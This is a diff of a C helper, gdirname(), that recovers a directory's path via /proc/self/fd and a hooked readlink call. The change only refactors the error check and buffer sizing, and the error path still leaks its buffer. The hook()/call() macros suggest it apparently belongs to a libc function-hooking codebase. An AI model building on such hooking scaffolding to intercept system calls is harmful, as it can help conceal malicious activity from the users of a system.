@@ -2,14 +2,15 @@
 #define DIR_H
 
 char *gdirname(DIR *dirp){
-    int fd = dirfd(dirp);
-    char path[PATH_MAX], *filename = (char *)malloc(PATH_MAX);
+    int fd = dirfd(dirp), readlink_status;
+    char path[PATH_MAX], *filename = (char *)malloc(sizeof(path));
     memset(filename, 0, PATH_MAX);
 
-    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);
+    snprintf(path, sizeof(path) - 1, "/proc/self/fd/%d", fd);
 
     hook(CREADLINK);
-    if((long)call(CREADLINK, path, filename, sizeof(path)-1) < 0) return NULL;
+    readlink_status = (long)call(CREADLINK, path, filename, sizeof(path) - 1);
+    if(readlink_status < 0) return NULL;
     return filename;
 }
 
